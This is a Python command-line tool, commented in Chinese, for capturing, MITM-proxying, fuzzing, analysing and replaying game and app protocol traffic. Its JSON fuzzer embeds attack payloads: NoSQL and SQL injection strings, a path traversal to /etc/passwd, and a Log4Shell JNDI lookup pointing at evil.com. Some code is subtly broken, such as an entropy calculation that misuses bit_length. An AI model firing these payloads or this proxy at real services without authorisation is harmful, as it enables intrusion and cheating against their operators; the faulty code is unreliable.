#!/usr/bin/env python3
"""
网络协议分析器 - 游戏/应用协议抓包重放Fuzzing
用法: python network_analyzer.py --capture --port 8888
      python network_analyzer.py --replay --pcap capture.pcap --target 127.0.0.1:8888
      python network_analyzer.py --sniff --process game.exe
      python network_analyzer.py --proxy --listen 8080 --target api.game.com:443
"""

import sys, os, socket, struct, time, json, threading, ssl
from pathlib import Path
from collections import defaultdict

# ======================== 简易PCAP写入 ========================
class PCAPWriter:
    """简易PCAP文件写入器"""
    GLOBAL_HEADER = struct.pack(
        "<IHHiIII",
        0xA1B2C3D4,  # magic
        2, 4,         # version
        0,            # thiszone
        0,            # sigfigs
        65535,        # snaplen
        1             # LINKTYPE_ETHERNET
    )

    def __init__(self, filepath):
        self.path = Path(filepath)
        self.fd = open(self.path, "wb")
        self.fd.write(self.GLOBAL_HEADER)
        self.packet_count = 0

    def write_packet(self, data, direction="IN", ts=None):
        if ts is None:
            ts = time.time()
        ts_sec = int(ts)
        ts_usec = int((ts - ts_sec) * 1_000_000)

        # 构造伪以太网帧
        eth_header = b"\x00" * 12 + b"\x08\x00"  # dst+src+ethertype=IPv4
        ip_header = self._build_ip_header(len(data), direction)
        tcp_header = self._build_tcp_header(len(data))

        packet = eth_header + ip_header + tcp_header + data
        incl_len = len(packet)
        orig_len = incl_len

        self.fd.write(struct.pack("<IIII", ts_sec, ts_usec, incl_len, orig_len))
        self.fd.write(packet)
        self.packet_count += 1

    def _build_ip_header(self, data_len, direction):
        # 简易IPv4头
        src = b"\x7f\x00\x00\x01" if direction == "OUT" else b"\xc0\xa8\x01\x01"
        dst = b"\xc0\xa8\x01\x01" if direction == "OUT" else b"\x7f\x00\x00\x01"
        total_len = 20 + 20 + data_len  # IP + TCP + data
        header = struct.pack(
            "!BBHHHBBH4s4s",
            0x45,        # version + IHL
            0,           # DSCP
            total_len,   # total length
            0,           # identification
            0x4000,      # flags + fragment
            64,          # TTL
            6,           # protocol TCP
            0,           # checksum (0 for simplicity)
            src, dst
        )
        return header

    def _build_tcp_header(self, data_len):
        return struct.pack(
            "!HHIIBBHHH",
            12345, 54321,  # src/dst port
            0, 0,          # seq/ack
            0x50,          # data offset
            0x18,          # flags (PSH+ACK)
            65535,         # window
            0, 0           # checksum, urgent
        )

    def close(self):
        self.fd.close()
        print("[*] PCAP saved: %s (%d packets)" % (self.path, self.packet_count))


# ======================== 流量捕获 ========================
class TrafficCapture:
    """原始socket流量捕获 (需要管理员权限)"""

    def __init__(self):
        self.capturing = False
        self.packets = []

    def capture_on_port(self, port, duration=30, output=None):
        """在指定端口捕获流量"""
        import subprocess

        print("[*] Capturing traffic on port %d for %ds..." % (port, duration))
        print("[!] May require Administrator privileges")

        # 尝试使用netsh trace (Windows)
        if sys.platform == "win32":
            try:
                etl_path = Path(output or "capture.etl")
                cmd = 'netsh trace start capture=yes IPv4.Address=0.0.0.0 tracefile="%s" maxsize=100' % etl_path
                subprocess.run(cmd, shell=True, timeout=5)
                print("[*] Netsh trace started...")
                time.sleep(duration)
                subprocess.run("netsh trace stop", shell=True, timeout=5)
                print("[+] Trace saved: %s" % etl_path)
                print("[!] Convert to pcap: etl2pcapng %s %s" % (etl_path, etl_path.with_suffix(".pcapng")))
            except Exception as e:
                print("[-] Netsh trace failed: %s" % e)
                print("[*] Try using Wireshark or tcpdump manually")

        return self.packets


# ======================== 代理拦截 ========================
class MITMProxy:
    """简易MITM代理 - 拦截HTTP/HTTPS/自定义TCP"""

    def __init__(self, listen_host="0.0.0.0", listen_port=8080):
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.target_host = None
        self.target_port = None
        self.running = False
        self.intercept_callback = None
        self.requests = []

    def set_target(self, host, port):
        self.target_host = host
        self.target_port = port

    def set_intercept(self, callback):
        """设置拦截回调: callback(data, direction) -> modified_data"""
        self.intercept_callback = callback

    def start(self):
        self.running = True
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.listen_host, self.listen_port))
        self.server.listen(5)
        self.server.settimeout(1)

        print("[*] MITM Proxy listening on %s:%d" % (self.listen_host, self.listen_port))
        if self.target_host:
            print("[*] Forwarding to %s:%d" % (self.target_host, self.target_port))

        try:
            while self.running:
                try:
                    client_sock, addr = self.server.accept()
                    print("[+] Connection from %s:%d" % addr)
                    thread = threading.Thread(target=self._handle_client, args=(client_sock,))
                    thread.daemon = True
                    thread.start()
                except socket.timeout:
                    continue
        except KeyboardInterrupt:
            print("\n[*] Proxy stopped")
        finally:
            self.server.close()

    def _handle_client(self, client_sock):
        try:
            if self.target_host:
                # 连接到目标
                target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                target_sock.settimeout(10)
                target_sock.connect((self.target_host, self.target_port))

                # 双向转发
                t1 = threading.Thread(target=self._relay, args=(client_sock, target_sock, "OUT"))
                t2 = threading.Thread(target=self._relay, args=(target_sock, client_sock, "IN"))
                t1.daemon = True
                t2.daemon = True
                t1.start()
                t2.start()
                t1.join(60)
                t2.join(60)

                target_sock.close()
            else:
                # 直接响应模式
                data = client_sock.recv(4096)
                if data:
                    req_info = {
                        "timestamp": time.time(),
                        "data": data,
                        "hex": data.hex() if len(data) < 1024 else data[:1024].hex() + "...",
                        "size": len(data),
                    }
                    self.requests.append(req_info)
                    print("[REQ] %d bytes: %s" % (len(data), data[:100]))

                    if self.intercept_callback:
                        response = self.intercept_callback(data, "IN")
                    else:
                        response = b"HTTP/1.1 200 OK\r\n\r\nProxied"

                    client_sock.send(response)

            client_sock.close()
        except Exception as e:
            print("[-] Proxy error: %s" % e)

    def _relay(self, src, dst, direction):
        try:
            pcap = None
            while True:
                data = src.recv(4096)
                if not data:
                    break

                if self.intercept_callback:
                    data = self.intercept_callback(data, direction)

                dst.send(data)
        except Exception:
            pass

    def stop(self):
        self.running = False


# ======================== 协议模糊测试 ========================
class ProtocolFuzzer:
    """协议模糊测试"""

    @staticmethod
    def fuzz_bytes(original, mutations=100):
        """对字节数组进行模糊变异"""
        import random
        results = []

        for i in range(mutations):
            data = bytearray(original)
            mutation_type = random.choice(["flip", "increment", "zero", "max", "random_byte", "insert", "delete", "overflow"])

            if len(data) == 0:
                continue

            pos = random.randint(0, len(data) - 1)

            if mutation_type == "flip":
                data[pos] ^= (1 << random.randint(0, 7))
            elif mutation_type == "increment":
                data[pos] = (data[pos] + random.randint(1, 10)) % 256
            elif mutation_type == "zero":
                data[pos] = 0
            elif mutation_type == "max":
                data[pos] = 0xFF
            elif mutation_type == "random_byte":
                data[pos] = random.randint(0, 255)
            elif mutation_type == "insert":
                data.insert(pos, random.randint(0, 255))
            elif mutation_type == "delete":
                if len(data) > 1:
                    del data[pos]
            elif mutation_type == "overflow":
                # 在特定位置写入远超预期长度的数据
                long_data = b"A" * random.randint(256, 4096)
                data[pos:pos] = long_data

            results.append({
                "id": i,
                "type": mutation_type,
                "data": bytes(data),
                "size": len(data),
            })

        return results

    @staticmethod
    def fuzz_json(original_json, mutations=50):
        """JSON协议模糊测试"""
        import random

        results = []
        try:
            obj = json.loads(original_json)
        except Exception:
            return [{"error": "invalid JSON"}]

        for i in range(mutations):
            test_obj = json.loads(json.dumps(obj))  # deep copy
            if isinstance(test_obj, dict) and test_obj:
                key = random.choice(list(test_obj.keys()))
                val = test_obj[key]
                mutation = random.choice([
                    lambda v: -v if isinstance(v, (int, float)) else v,
                    lambda v: v * 1000000 if isinstance(v, (int, float)) else v,
                    lambda v: 0 if isinstance(v, (int, float)) else "",
                    lambda v: "A" * 10000 if isinstance(v, str) else v,
                    lambda v: None,
                    lambda v: True,
                    lambda v: {"$gt": ""},  # NoSQL injection
                    lambda v: "' OR '1'='1",  # SQL injection
                    lambda v: "../../../etc/passwd" if isinstance(v, str) else v,
                    lambda v: "${jndi:ldap://evil.com/a}" if isinstance(v, str) else v,
                ])
                test_obj[key] = mutation(val)

            results.append({
                "id": i,
                "payload": json.dumps(test_obj),
                "changed_key": key if isinstance(test_obj, dict) else None,
            })

        return results


# ======================== 游戏协议分析 ========================
class GameProtocolAnalyzer:
    """游戏协议分析"""

    @staticmethod
    def analyze_patterns(packets):
        """分析数据包模式"""
        analysis = {
            "total_packets": len(packets),
            "size_stats": {},
            "common_prefixes": defaultdict(int),
            "common_suffixes": defaultdict(int),
            "magic_bytes": [],
        }

        # 大小统计
        sizes = [len(p) for p in packets]
        if sizes:
            analysis["size_stats"] = {
                "min": min(sizes), "max": max(sizes),
                "avg": sum(sizes) / len(sizes),
                "unique_sizes": len(set(sizes)),
            }

        # 前4字节模式 (可能是包头magic/长度字段)
        for p in packets:
            if len(p) >= 4:
                prefix = p[:4]
                analysis["common_prefixes"][prefix.hex()] += 1

        # 长度字段检测
        for p in packets:
            if len(p) >= 4:
                # 前2字节作为长度
                header_len = struct.unpack("<H", p[:2])[0]
                if header_len == len(p) or header_len == len(p) - 2:
                    analysis["length_field"] = {
                        "offset": 0, "size": 2, "endian": "little",
                        "includes_header": (header_len == len(p)),
                    }
                    break

        return analysis

    @staticmethod
    def detect_encryption(packets):
        """检测加密特征"""
        results = []

        for i, p in enumerate(packets[:20]):
            if len(p) < 16:
                continue

            # 熵值检查
            freq = [0] * 256
            for b in p:
                freq[b] += 1

            entropy = 0
            for f in freq:
                if f > 0:
                    p_val = f / len(p)
                    entropy -= p_val * (p_val.bit_length() - 1)

            # 高熵=加密/压缩
            if entropy > 7.0:
                results.append({
                    "packet": i,
                    "entropy": round(entropy, 2),
                    "suspected": "encrypted_or_compressed",
                })

        return results

    @staticmethod
    def find_repeating_patterns(packets, min_len=4):
        """查找重复模式"""
        patterns = defaultdict(list)

        for p_idx, p in enumerate(packets):
            for i in range(len(p) - min_len + 1):
                pattern = p[i:i+min_len]
                patterns[pattern].append((p_idx, i))

        # 返回出现在多个不同数据包中的模式
        common = {}
        for pattern, positions in patterns.items():
            unique_packets = set(pos[0] for pos in positions)
            if len(unique_packets) >= 2:
                common[pattern.hex()] = {
                    "pattern": pattern.hex(),
                    "occurrences": len(positions),
                    "unique_packets": len(unique_packets),
                    "first_positions": positions[:3],
                }

        return dict(sorted(common.items(), key=lambda x: x[1]["occurrences"], reverse=True)[:20])


# ======================== CLI ========================
def main():
    import argparse
    parser = argparse.ArgumentParser(description="网络协议分析器 - 抓包/重放/Fuzzing")

    subparsers = parser.add_subparsers(dest="command", help="Commands")

    # capture命令
    cap_parser = subparsers.add_parser("capture", help="捕获流量")
    cap_parser.add_argument("--port", "-p", type=int, default=80, help="目标端口")
    cap_parser.add_argument("--duration", "-d", type=int, default=30, help="捕获时长(秒)")
    cap_parser.add_argument("--output", "-o", default="capture.pcap", help="输出PCAP文件")

    # proxy命令
    proxy_parser = subparsers.add_parser("proxy", help="启动MITM代理")
    proxy_parser.add_argument("--listen", "-l", default="0.0.0.0", help="监听地址")
    proxy_parser.add_argument("--port", "-p", type=int, default=8080, help="监听端口")
    proxy_parser.add_argument("--target", "-t", help="转发目标 host:port (e.g. api.game.com:443)")

    # fuzz命令
    fuzz_parser = subparsers.add_parser("fuzz", help="协议模糊测试")
    fuzz_parser.add_argument("--input", "-i", required=True, help="输入数据 (hex字符串或JSON)")
    fuzz_parser.add_argument("--mutations", "-n", type=int, default=50, help="变异数量")
    fuzz_parser.add_argument("--output", "-o", help="输出JSON文件")

    # analyze命令
    analyze_parser = subparsers.add_parser("analyze", help="分析协议模式")
    analyze_parser.add_argument("--input", "-i", required=True, nargs="+", help="数据包文件 (.pcap/.bin)")

    # replay命令
    replay_parser = subparsers.add_parser("replay", help="重放数据包")
    replay_parser.add_argument("--pcap", required=True, help="PCAP文件")
    replay_parser.add_argument("--target", "-t", required=True, help="目标 host:port")
    replay_parser.add_argument("--delay", type=float, default=0.1, help="包间延迟(秒)")

    args = parser.parse_args()

    if args.command == "capture":
        capture = TrafficCapture()
        capture.capture_on_port(args.port, args.duration, args.output)

    elif args.command == "proxy":
        proxy = MITMProxy(args.listen, args.port)
        if args.target:
            parts = args.target.split(":")
            proxy.set_target(parts[0], int(parts[1]))
        try:
            proxy.start()
        except KeyboardInterrupt:
            proxy.stop()

    elif args.command == "fuzz":
        if args.input.startswith("{") or args.input.startswith("["):
            results = ProtocolFuzzer.fuzz_json(args.input, args.mutations)
        else:
            # 尝试hex解析
            try:
                original = bytes.fromhex(args.input.replace(" ", ""))
            except ValueError:
                original = args.input.encode()
            results = ProtocolFuzzer.fuzz_bytes(original, args.mutations)

        for r in results[:10]:
            if "payload" in r:
                print("  [%d] %s" % (r["id"], r["payload"][:100]))
            else:
                print("  [%d] [%s] %d bytes: %s" % (r["id"], r.get("type","?"), r.get("size",0), r["data"][:60].hex()))

        if args.output:
            with open(args.output, "w") as f:
                json.dump(results, f, indent=2, default=str)
            print("[+] Saved: %s (%d mutations)" % (args.output, len(results)))

    elif args.command == "analyze":
        packets = []
        for fpath in args.input:
            path = Path(fpath)
            if path.suffix == ".pcap":
                print("[-] PCAP parsing requires scapy. Reading as raw.")
                packets.append(path.read_bytes())
            else:
                packets.append(path.read_bytes())

        analyzer = GameProtocolAnalyzer()
        analysis = analyzer.analyze_patterns(packets)
        print("\n  [Protocol Analysis]")
        print(json.dumps(analysis, indent=2, default=str))

        encryption = analyzer.detect_encryption(packets)
        if encryption:
            print("\n  [Encryption Detection]")
            for e in encryption:
                print("  Packet %d: entropy=%.2f -> %s" % (e["packet"], e["entropy"], e["suspected"]))

    elif args.command == "replay":
        pcap_path = Path(args.pcap)
        if not pcap_path.exists():
            print("[-] PCAP not found: %s" % args.pcap)
            return 1

        host, port = args.target.split(":")
        port = int(port)

        print("[*] Replaying %s -> %s:%d" % (pcap_path, host, port))

        # 简易重放 (需要scapy做完整解析)
        data = pcap_path.read_bytes()
        # 尝试发送原始数据
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            sock.send(data[:4096])
            response = sock.recv(4096)
            print("[+] Response: %s" % response[:200].hex())
            sock.close()
        except Exception as e:
            print("[-] Replay failed: %s" % e)

    else:
        parser.print_help()


if __name__ == "__main__":
    main()
